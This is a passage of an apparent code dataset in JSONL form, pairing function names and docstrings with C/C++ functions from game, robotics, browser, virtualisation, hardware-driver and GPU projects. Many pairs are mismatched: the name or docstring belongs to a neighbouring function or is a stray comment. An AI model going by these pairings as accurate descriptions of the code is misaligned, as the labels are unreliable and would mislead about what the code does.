*\/\\n    printf(\"MEMO SIZE %d\\\\n\", (int)memo.size());\\n    return 0;\\n}'}","id":3809}
{"content":"{'function_name': 'U3CCreateWhereIteratorU3Ec__Iterator1D_1_MoveNext_m13927', 'docstring': '\/\/ Dead block : IL_00c2: ldloc.2', 'code': 'void U3CCreateWhereIteratorU3Ec__Iterator1D_1_Dispose_m13928 (U3CCreateWhereIteratorU3Ec__Iterator1D_1_t2881 * __this, MethodInfo* method){\\n\\tuint32_t V_0 = 0;\\n\\tint32_t leaveInstructions[1] = {0};\\n\\tException_t71 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t71 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\t{\\n\\t\\tint32_t L_0 = (__this->___$PC_4);\\n\\t\\tV_0 = L_0;\\n\\t\\t__this->___$PC_4 = (-1);\\n\\t\\tif (V_0 == 0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_003b;\\n\\t\\t}\\n\\t\\tif (V_0 == 1)\\n\\t\\t{\\n\\t\\t\\tgoto IL_0021;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tgoto IL_003b;\\n\\t}\\n\\nIL_0021:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t\/\/ IL_0021: leave IL_003b\\n\\t\\tleaveInstructions[0] = 0x3B; \/\/ 1\\n\\t\\tTHROW_SENTINEL(IL_003b);\\n\\t\\t\/\/ finally target depth: 1\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppFinallySentinel& e)\\n\\t{\\n\\t\\tgoto IL_0026;\\n\\t}\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__last_unhandled_exception = (Exception_t71 *)e.ex;\\n\\t\\tgoto IL_0026;\\n\\t}\\n\\nIL_0026:\\n\\t{ \/\/ begin finally (depth: 1)\\n\\t\\t{\\n\\t\\t\\tObject_t* L_1 = (__this->___U3C$s_97U3E__0_1);\\n\\t\\t\\tif (L_1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002e:\\n\\t\\t{\\n\\t\\t\\t\/\/ finally node depth: 1\\n\\t\\t\\tswitch (leaveInstructions[0])\\n\\t\\t\\t{\\n\\t\\t\\t\\tcase 0x3B:\\n\\t\\t\\t\\t\\tgoto IL_003b;\\n\\t\\t\\t\\tdefault:\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t#if IL2CPP_DEBUG\\n\\t\\t\\t\\t\\tassert( __last_unhandled_exception != 0 && \"invalid leaveInstruction at depth 1, __last_unhandled_exception has not been set\");\\n\\t\\t\\t\\t\\t#endif\\n\\t\\t\\t\\t\\tException_t71 * _tmp_exception_local = __last_unhandled_exception;\\n\\t\\t\\t\\t\\t__last_unhandled_exception = 0;\\n\\t\\t\\t\\t\\til2cpp_codegen_raise_exception(_tmp_exception_local);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002f:\\n\\t\\t{\\n\\t\\t\\tObject_t* L_2 = (__this->___U3C$s_97U3E__0_1);\\n\\t\\t\\tNullCheck(L_2);\\n\\t\\t\\tInterfaceActionInvoker0::Invoke(&IDisposable_Dispose_m425_MethodInfo, L_2);\\n\\t\\t\\t\/\/ finally node depth: 1\\n\\t\\t\\tswitch (leaveInstructions[0])\\n\\t\\t\\t{\\n\\t\\t\\t\\tcase 0x3B:\\n\\t\\t\\t\\t\\tgoto IL_003b;\\n\\t\\t\\t\\tdefault:\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t#if IL2CPP_DEBUG\\n\\t\\t\\t\\t\\tassert( __last_unhandled_exception != 0 && \"invalid leaveInstruction at depth 1, __last_unhandled_exception has not been set\");\\n\\t\\t\\t\\t\\t#endif\\n\\t\\t\\t\\t\\tException_t71 * _tmp_exception_local = __last_unhandled_exception;\\n\\t\\t\\t\\t\\t__last_unhandled_exception = 0;\\n\\t\\t\\t\\t\\til2cpp_codegen_raise_exception(_tmp_exception_local);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t} \/\/ end finally (depth: 1)\\n\\nIL_003b:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":3813}
{"content":"{'function_name': 'driveStraight', 'docstring': '\/\/ did we fail to keep straight? (5 deg tolerance)', 'code': 'bool turnDeg(frc::ADXRS450_Gyro& gyro, frc::DifferentialDrive& mots, double angleDeg, RobotBase* robot = nullptr){\\n\\n\\t\\tconst double cycleTime = 0.004, \/\/ prevent cpu taxing\\n\\t\\t\\t\\t\\t tolerance = 3,\\t\\t\/\/ how close is \"good enough\" (values too low cause infinite spinning)\\n\\t\\t\\t\\t\\t turnSpeed = 0.5;\\n\\n\\n\\t\\tgyro.Reset();\\n\\n\\t\\tstd::cout <<\"turning \" <<angleDeg <<\" degrees... \";\\n\\n\\t\\t\/\/ turning right\\n\\t\\tif (angleDeg > 0) {\\n\\t\\t\\twhile (gyro.GetAngle() - angleDeg < -tolerance && robot ? robot->IsAutonomous() : false) {\\n\\t\\t\\t\\t\/\/ turn at 50% speed until u get within 10 deg,\\n\\t\\t\\t\\t\/\/ then lower speed linearly as you approach\\n\\t\\t\\t\\t\/\/ you are not expected to understand this code\\n\\t\\t\\t\\tmots.ArcadeDrive(0,\\n\\t\\t\\t\\t\\t\\tstd::fabs(angleDeg - (gyro.GetAngle() - offset)) > 10 ?\\n\\t\\t\\t\\t\\t\\t\\tturnSpeed :\\n\\t\\t\\t\\t\\t\\t\\tturnSpeed * ((gyro.GetAngle() - offset) - angleDeg) \/ 10\\n\\t\\t\\t\\t\\t\\t\\t\\t+ 0.1\/\/ * angleDeg - gyro.GetAngle() > 0 ? 1 : -1\\n\\t\\t\\t\\t);\\n\\n\\t\\t\\t\\t\/\/ prevent CPU taxing\\n\\t\\t\\t\\tWait(cycleTime);\\n\\t\\t\\t}\\n\\n\\t\\t\/\/ turning left\\n\\t\\t} else {\\n\\t\\t\\twhile (gyro.GetAngle() - angleDeg > tolerance && robot ? robot->IsAutonomous() : false) {\\n\\t\\t\\t\\t\/\/ turn at 50% speed until u get within 10 deg,\\n\\t\\t\\t\\t\/\/ then lower speed linearly as you approach\\n\\t\\t\\t\\tmots.ArcadeDrive(0,\\n\\t\\t\\t\\t\\t\\t-(std::fabs(angleDeg - (gyro.GetAngle() - offset)) > 10 ?\\n\\t\\t\\t\\t\\t\\t\\t\\tturnSpeed :\\n\\t\\t\\t\\t\\t\\t\\t\\tturnSpeed * -(angleDeg - (gyro.GetAngle() - offset)) \/ 10\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t+ 0.1\/\/ * angleDeg - gyro.GetAngle() > 0 ? 1 : -1\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t)\\n\\t\\t\\t\\t);\\n\\n\\t\\t\\t\\t\/\/ prevent CPU taxing\\n\\t\\t\\t\\tWait(cycleTime);\\n\\t\\t\\t}\\n\\n\\t\\t}\\n\\n\\t\\tmots.ArcadeDrive(0.0, 0.0);\\n\\n\\t\\tstd::cout <<\"done (dif = \" <<(gyro.GetAngle() - offset) - angleDeg <<\")\\\\n\";\\n\\n\\t\\t\/\/ did we fail to turn the correct angle (5 deg tolerance)\\n\\t\\treturn std::fabs((gyro.GetAngle() - offset) - angleDeg) > 5;\\n\\t}'}","id":3815}
{"content":"{'function_name': 'GetMonochrome', 'docstring': '\/\/ 0!', 'code': 'static nsresult\\nGetResolution(nsPresContext* aPresContext, const nsMediaFeature*,\\n              nsCSSValue& aResult)\\n{\\n    \/\/ Resolution measures device pixels per CSS (inch\/cm\/pixel).  We\\n    \/\/ return it in device pixels per CSS inches.\\n    \/\/\\n    \/\/ However, on platforms where the CSS viewport is not fixed to the\\n    \/\/ screen viewport, use the device resolution instead (bug 779527).\\n    nsIPresShell *shell = aPresContext->PresShell();\\n    float appUnitsPerInch = shell->GetIsViewportOverridden() ?\\n            GetDeviceContextFor(aPresContext)->AppUnitsPerPhysicalInch() :\\n            nsPresContext::AppUnitsPerCSSInch();\\n\\n    float dpi = appUnitsPerInch \/\\n                float(aPresContext->AppUnitsPerDevPixel());\\n    aResult.SetFloatValue(dpi, eCSSUnit_Inch);\\n    return NS_OK;\\n}'}","id":3826}
{"content":"{'function_name': 'sp_sense_send', 'docstring': '\/\/ Send groups of data', 'code': 'static int parse_poll_response (uint32_t s, char *buff)\\n{\\n  byte markcnt = 0;\\n  char c;\\n\\n  \/\/ Make sure we have some data coming\\n  if (!data_available(s, 5))\\n    return -SENSE_ERR_TIMEOUT;\\n\\n  while (data_available(s)) {\\n    c = sp_read (s);\\n    if (\\'\\\\\"\\' == c) {\\n      if (++markcnt == 7) {\\n        while (data_available(s)) {\\n          if ((c = sp_read(s)) == \\'\\\\\"\\') {\\n            *buff = 0;\\n            return SENSE_OK;\\n          }\\n          *buff++ = c;\\n        }\\n      }\\n    }\\n  }\\n  return -SENSE_ERR_JSON_ERROR;\\n}'}","id":3843}
{"content":"{'function_name': 'cpumR0MapLocalApicCpuChecker', 'docstring': '\/*\\n     * 0x0X       82489 external APIC\\n     * 0x1X       Local APIC\\n     * 0x2X..0xFF reserved\\n     *\/', 'code': 'static int cpumR0MapLocalApics(void)\\n{\\n    \/*\\n     * Check that we\\'ll always stay within the array bounds.\\n     *\/\\n    if (RTMpGetArraySize() > RT_ELEMENTS(g_aLApics))\\n    {\\n        LogRel((\"CPUM: Too many real CPUs\/cores\/threads - %u, max %u\\\\n\", RTMpGetArraySize(), RT_ELEMENTS(g_aLApics)));\\n        return VERR_TOO_MANY_CPUS;\\n    }\\n\\n    \/*\\n     * Create mappings for all online CPUs we think have legacy APICs.\\n     *\/\\n    int rc = RTMpOnAll(cpumR0MapLocalApicCpuProber, NULL, NULL);\\n\\n    for (unsigned iCpu = 0; RT_SUCCESS(rc) && iCpu < RT_ELEMENTS(g_aLApics); iCpu++)\\n    {\\n        if (g_aLApics[iCpu].fEnabled && !g_aLApics[iCpu].fX2Apic)\\n        {\\n            rc = RTR0MemObjEnterPhys(&g_aLApics[iCpu].hMemObj, g_aLApics[iCpu].PhysBase,\\n                                     PAGE_SIZE, RTMEM_CACHE_POLICY_MMIO);\\n            if (RT_SUCCESS(rc))\\n            {\\n                rc = RTR0MemObjMapKernel(&g_aLApics[iCpu].hMapObj, g_aLApics[iCpu].hMemObj, (void *)-1,\\n                                         PAGE_SIZE, RTMEM_PROT_READ | RTMEM_PROT_WRITE);\\n                if (RT_SUCCESS(rc))\\n                {\\n                    g_aLApics[iCpu].pv = RTR0MemObjAddress(g_aLApics[iCpu].hMapObj);\\n                    continue;\\n                }\\n                RTR0MemObjFree(g_aLApics[iCpu].hMemObj, true \/* fFreeMappings *\/);\\n            }\\n            g_aLApics[iCpu].fEnabled = false;\\n        }\\n        g_aLApics[iCpu].pv = NULL;\\n    }\\n\\n    \/*\\n     * Check the APICs.\\n     *\/\\n    if (RT_SUCCESS(rc))\\n        rc = RTMpOnAll(cpumR0MapLocalApicCpuChecker, NULL, NULL);\\n\\n    if (RT_FAILURE(rc))\\n    {\\n        cpumR0UnmapLocalApics();\\n        return rc;\\n    }\\n\\n#ifdef LOG_ENABLED\\n    \/*\\n     * Log the result (pretty useless, requires enabling CPUM in VBoxDrv\\n     * and !VBOX_WITH_R0_LOGGING).\\n     *\/\\n    if (LogIsEnabled())\\n    {\\n        uint32_t cEnabled = 0;\\n        uint32_t cX2Apics = 0;\\n        for (unsigned iCpu = 0; iCpu < RT_ELEMENTS(g_aLApics); iCpu++)\\n            if (g_aLApics[iCpu].fEnabled)\\n            {\\n                cEnabled++;\\n                cX2Apics += g_aLApics[iCpu].fX2Apic;\\n            }\\n        Log((\"CPUM: %u APICs, %u X2APICs\\\\n\", cEnabled, cX2Apics));\\n    }\\n#endif\\n\\n    return VINF_SUCCESS;\\n}'}","id":3850}
{"content":"{'function_name': 'test_is_path_exists', 'docstring': '\/\/e1[6] = g1.add_edge(n1[3], n1[5]);', 'code': 'int main() {\\n    \/\/en.wikipedia.org\/wiki\/Graph_theory\\n    lib::Graph<int> g1;\\n    int n1[6]; \/\/node_ordinals\\n    int e1[7]; \/\/edge_ordinals\\n\\n    int a = 1, b = 2, c = 3, d = 4, e = 5, f = 6;\\n\\n    n1[0] = g1.add_node(a);\\n    n1[1] = g1.add_node(b);\\n    n1[2] = g1.add_node(c);\\n    n1[3] = g1.add_node(d);\\n    n1[4] = g1.add_node(e);\\n    n1[5] = g1.add_node(f);\\n\\n    e1[0] = g1.add_edge(n1[0], n1[1]);\\n    e1[1] = g1.add_edge(n1[0], n1[4]);\\n    e1[2] = g1.add_edge(n1[1], n1[2]);\\n    e1[3] = g1.add_edge(n1[1], n1[4]);\\n    e1[4] = g1.add_edge(n1[2], n1[3]);\\n    e1[5] = g1.add_edge(n1[3], n1[4]);\\n    e1[6] = g1.add_edge(n1[3], n1[5]);\\n\\n    std::cout << \"no. of nodes: \" << g1.num_nodes() << \" no. of edges: \"\\n            << g1.num_edges() << std::endl;\\n    g1.print();\\n    g1.export_as_gml(\"graph.gml\");\\n\\n    g1.delete_node(n1[4]);\\n    g1.delete_edge(e1[2]);\\n\\n    try {\\n        std::cout << g1.get_node(n1[4]);\\n    } catch (...) {\\n        std::cout << \"expected exception on accessing deleted element\"\\n                << std::endl;\\n    }\\n\\n    std::cout << \"no. of nodes: \" << g1.num_nodes() << \" no. of edges: \"\\n            << g1.num_edges() << std::endl;\\n    g1.print();\\n\\n    test_attributes();\\n    test_topological_sort();\\n    test_dft_digraph();\\n    test_dft_undigraph();\\n    test_bft_digraph();\\n    test_bft_undigraph();\\n    test_bipartite_digraph();\\n    \/\/test_bipartite_undigraph();\\n    \/\/test_notbipartite_undigraph();\\n    test_min_spanning_tree();\\n    test_graph_import_export();\\n\\n    return 0;\\n}'}","id":3851}
{"content":"{'function_name': 'LTR114_Start', 'docstring': '\/*\\n     * \u0417\u0430\u043f\u0443\u0441\u043a \u0441\u0431\u043e\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043c\u043e\u0434\u0443\u043b\u0435\u043c LTR114.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u043d\u0430 \u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u044b\u0439 \u0441\u0431\u043e\u0440 \u0434\u0430\u043d\u043d\u044b\u0445.\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n     *\/', 'code': 'INT LTR114_Stop\\n    (\\n    PTLTR114 hnd\\n    )\\n    {\\n    \/*\\n     * \u041f\u0435\u0440\u0435\u0432\u043e\u0434 \u043c\u043e\u0434\u0443\u043b\u044f LTR114 \u0432 \u0440\u0435\u0436\u0438\u043c \u043e\u0436\u0438\u0434\u0430\u043d\u0438\u044f.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u0430 \u043c\u043e\u0434\u0443\u043b\u044f \u0438 \u043e\u0436\u0438\u0434\u0430\u0435\u0442\u0441\u044f \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u043a\u043e\u043c\u0430\u043d\u0434\u044b\\n     *   \u043e\u0442 \u043c\u043e\u0434\u0443\u043b\u044f.\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u043c\u043e\u0434\u0443\u043b\u044f.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n     *\/\\n\\n#define RD_BUFSZ (100)\\n    DWORD ack;\\n    DWORD cmd;\\n    DWORD rd_buf[RD_BUFSZ];\\n    long rd_cnt;\\n    INT ret_val = LTR_OK;\\n    DWORD tick;\\n\\n\\n\\n\\n    if (hnd == NULL)\\n        {\\n        ret_val = LTR114_ERR_INVALID_DESCR;\\n        }\\n    else\\n        {\\n        long n;\\n        hnd->Active = FALSE;\\n        cmd = fill_command(stop_cmd, 0);\\n        if ((n = LTR_Send(&hnd->Channel, &cmd, 1, send_tm_out)) < 0)\\n            {\\n            ret_val = n;\\n            }\\n        if (n != 1)\\n            {\\n            ret_val = LTR_ERROR_SEND;\\n            }\\n        else\\n            {\\n            int data_received = 0;\\n            DWORD elapsed_time;\\n            const DWORD rx_time_out = 100;\\n\\n            \/* \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u0440\u0438\u0445\u043e\u0434\u0430 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u0445\u043e\u0434\u0430 \u0432 \u0440\u0435\u0436\u0438\u043c \u043e\u0436\u0438\u0434\u0430\u043d\u0438\u044f *\/\\n            tick = GetTickCount();\\n            ack = ~stop_ack;\\n            do\\n                {\\n                rd_cnt = (long)LTR_Recv(&hnd->Channel, rd_buf, NULL, RD_BUFSZ, rx_time_out);\\n                if (rd_cnt > 0)                     \/* \u0435\u0441\u0442\u044c \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 *\/\\n                    {\\n                    \/* \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f *\/\\n                    ack = rd_buf[rd_cnt - 1] & ack_mask;\\n                    data_received = 1;\\n                    }\\n                elapsed_time = f_elapsed_time(tick);\\n                } while ((elapsed_time <= ack_tm_out) && (rd_cnt >= 0) && (ack != stop_ack));\\n            if (!data_received)                     \/* \u043e\u0442 \u043c\u043e\u0434\u0443\u043b\u044f \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u043f\u0440\u0438\u0448\u043b\u043e *\/\\n                {\\n                ret_val = LTR114_ERR_NOACK;\\n                }\\n            else if (ack != stop_ack)               \/* \u043d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435 *\/\\n                {\\n                ret_val = LTR114_ERR_INVALIDACK;\\n                }\\n            }\\n        } \/*else @if (hnd->Channel == NULL)@*\/\\n\\n    return ret_val;\\n#undef RD_BUFSZ\\n    }'}","id":3860}
{"content":"{'function_name': 'CreateCommandQueuesVIAamf', 'docstring': '\/\/ initialize AMF', 'code': 'AMF_RESULT CreateCommandQueuesVIAamf(\\n    int                         deviceIndex,\\n    amf_int32                   flag1,\\n    amf::AMFCompute             **compute1,\\n    amf_int32                   flag2,\\n    amf::AMFCompute             **compute2,\\n    AMF_CONTEXT_DEVICETYPE_ENUM amfDeviceType,\\n    amf::AMFContext             **context = nullptr\\n    )\\n{\\n    bool AllIsOK = true;\\n\\n    if (compute1 && *compute1)\\n    {\\n        (*compute1)->Release();\\n        *compute1 = nullptr;\\n    }\\n\\n    if (compute2 && *compute2)\\n    {\\n        (*compute2)->Release();\\n        *compute2 = nullptr;\\n    }\\n\\n    AMF_RESULT result = g_AMFFactory.Init();\\n    AMF_RETURN_IF_FAILED(result, L\"Factory init failed\");\\n\\n    \/\/ Create default CPU AMF context.\\n    amf::AMFContextPtr contextAMF = nullptr;\\n    result = g_AMFFactory.GetFactory()->CreateContext(&contextAMF);\\n    AMF_RETURN_IF_FAILED(result, L\"CreateContext failed\");\\n\\n    if (context)\\n    {\\n        *context = contextAMF;\\n        (*context)->Acquire();\\n    }\\n\\n    result = contextAMF->SetProperty(AMF_CONTEXT_DEVICE_TYPE, amfDeviceType);\\n    AMF_RETURN_IF_FAILED(result, L\"SetProperty failed\");\\n\\n    amf::AMFComputeFactoryPtr computeFactory = nullptr;\\n\\n#if !defined ENABLE_METAL\\n    result = contextAMF->GetOpenCLComputeFactory(&computeFactory);\\n    AMF_RETURN_IF_FAILED(result, L\"GetOpenCLComputeFactory failed\");\\n#else\\n    amf::AMFContext3Ptr context3(contextAMF);\\n    AMF_RETURN_IF_FALSE(context3 != nullptr, AMF_NOT_SUPPORTED);\\n\\n    result = context3->GetMetalComputeFactory(&computeFactory);\\n    AMF_RETURN_IF_FAILED(result, L\"GetMetalComputeFactory failed\");\\n#endif\\n\\n    amf_int32 deviceCount = computeFactory->GetDeviceCount();\\n\\n    if (deviceIndex >= deviceCount)\\n    {\\n        AMF_RETURN_IF_FAILED(AMF_INVALID_ARG, L\"Incorrect deviceIndex\");\\n    }\\n\\n    amf::AMFComputeDevicePtr computeDevice;\\n    result = computeFactory->GetDeviceAt(deviceIndex, &computeDevice);\\n    AMF_RETURN_IF_FAILED(result, L\"GetDeviceAt failed\");\\n\\n#if !defined ENABLE_METAL\\n    result = contextAMF->InitOpenCLEx(computeDevice);\\n#else\\n    result = context3->InitMetalEx(computeDevice);\\n#endif\\n\\n    AMF_RETURN_IF_FAILED(result, L\"Initialization failed\");\\n\\n    if (compute1)\\n    {\\n        amf_int64 param = flag1 & 0x0FFFF;\\n        result = computeDevice->SetProperty(AMFQUEPROPERTY, param);\\n        AMF_RETURN_IF_FAILED(result, L\"SetProperty failed\");\\n\\n        result = computeDevice->CreateCompute(nullptr, compute1);\\n        AMF_RETURN_IF_FAILED(result, L\"CreateCompute 1 failed\");\\n    }\\n\\n    if (compute2)\\n    {\\n        amf_int64 param = flag2 & 0x0FFFF;\\n        result = computeDevice->SetProperty(AMFQUEPROPERTY, param);\\n        AMF_RETURN_IF_FAILED(result, L\"SetProperty failed\");\\n\\n        result = computeDevice->CreateCompute(nullptr, compute2);\\n        AMF_RETURN_IF_FAILED(result, L\"CreateCompute 2 failed\");\\n    }\\n\\n    return result;\\n}'}","id":3870}
{"content":"{'function_name': 'generate_insert_platform_SQL_command', 'docstring': '\/\/   cout << \"inside databasefunc::generate_platform_SQL_command()\" << endl;', 'code': 'bool insert_sensor(gis_database* gis_database_ptr,string description)\\n   {\\n\/\/      cout << \"inside databasefunc::insert_sensor()\" << endl;\\n\\n      string curr_insert_command=\\n         databasefunc::generate_insert_sensor_SQL_command(description);\\n      \\n      vector<string> insert_commands;\\n      insert_commands.push_back(curr_insert_command);\\n\/\/      cout << \"insert_commands.back() = \" << insert_commands.back() << endl;\\n\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;\\n\\n      gis_database_ptr->set_SQL_commands(insert_commands);\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":3871}
{"content":"{'function_name': 'ENUM_HEXUNITS', 'docstring': '\/\/ TODO: re-vet this logic for Total War', 'code': 'ENUM_HEXUNITS(x, y, c)\\n\\t{\\n\\t\\tif ( c->getCounterType( ) != Counter::Type::UNIT )\\n\\t\\t\\tcontinue;\\n\\n\\t\\tGroundUnit* u = (GroundUnit*)c;\\n\\n\\t\\t\/\/ dir==-1 if not given\\n\\t\\tif ( dir >= 0 && u->getAttackDir( ) != dir )\\n\\t\\t\\tcontinue;\\n\\n\\t\\t\/\/ divisions and corps support everybody\\n\\t\\t\/\/ (if they are not self-supported or unsupported)\\n\\t\\tif (\\tu->getSize( ) >= GroundUnit::Size::DIVISIONAL\\n\\t\\t\\t\\t&& ! u->isCadre( )\\n\\t\\t\\t\\t&& u->getFlag( GroundUnit::SUPPORTED ) == 0  \/\/ does this mean self-supported?\\n\\t\\t\\t\\t&& u->getFlag( GroundUnit::UNSUPPORTED ) == 0 )\\n\\t\\t\\treturn true;\\n\\n\\t\\t\/\/ artillery or HQ supports everybody\\n\\t\\tif (\\tu->getType( ) == GroundUnitType::WW2::ART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::LR_SIEGE_ART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::MORTAR\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::RKT_ART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::SIEGE_ART\\n\\t\\t\\t\\t|| u->getSize( ) == GroundUnit::Size::HQ\\n\\t\\t\\t\\t\/\/ ww1 artillery types:\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::COASTART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::FLDART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::FOOTART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::HVART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::HVMORT\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::HVSIEGEART\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::LTMORT\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::SIEGEMORT\\n\\t\\t\\t\\t\/\/ ww2pac:\\n\\t\\t\\t\\t|| u->getType( ) == GroundUnitType::WW2::HORS_ART )\\n\\t\\t\\treturn true;\\n\\t}'}","id":3877}
{"content":"{'function_name': 'verticalLinePoints', 'docstring': '\/\/  if (rank==0) cout << \"verticalLinePoints: pointIncrement \" << pointIncrement << endl;', 'code': \"VerticalLineSolutionValues computeVerticalLineSolutionValuesExhaustive(double xValue, FunctionPtr u1_prev, FunctionPtr u2_prev,\\n    FunctionPtr p_prev, FunctionPtr vorticity,\\n    FunctionPtr sigma11_prev, FunctionPtr sigma12_prev,\\n    FunctionPtr sigma21_prev, FunctionPtr sigma22_prev)\\n{\\n\\n  ((PreviousSolutionFunction*) u1_prev.get())->setOverrideMeshCheck(false); \/\/ allows Function::evaluate() call, below\\n  ((PreviousSolutionFunction*) u2_prev.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) p_prev.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) vorticity.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) sigma11_prev.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) sigma12_prev.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) sigma21_prev.get())->setOverrideMeshCheck(false);\\n  ((PreviousSolutionFunction*) sigma22_prev.get())->setOverrideMeshCheck(false);\\n\\n  double pOffset = Function::evaluate(p_prev, 0.5, 0.5);\\n  VerticalLineSolutionValues values;\\n\\n  double y;\\n  double x = xValue;\\n  values.x = xValue;\\n  values.yPoints = verticalLinePoints(); \/\/ matches Botella & Peyret's points\\n  for (int i=0; i<values.yPoints.size(); i++)\\n  {\\n    y = values.yPoints[i];\\n    values.u1.push_back( Function::evaluate(u1_prev, x, y) );\\n    values.u2.push_back( Function::evaluate(u2_prev, x, y) );\\n    values.p.push_back( Function::evaluate(p_prev, x, y) - pOffset );\\n    values.omega.push_back( Function::evaluate(vorticity, x, y) );\\n    values.sigma11.push_back( Function::evaluate(sigma11_prev, x, y) );\\n    values.sigma12.push_back( Function::evaluate(sigma12_prev, x, y) );\\n    values.sigma21.push_back( Function::evaluate(sigma21_prev, x, y) );\\n    values.sigma22.push_back( Function::evaluate(sigma22_prev, x, y) );\\n  }\\n  return values;\\n}\"}","id":3879}
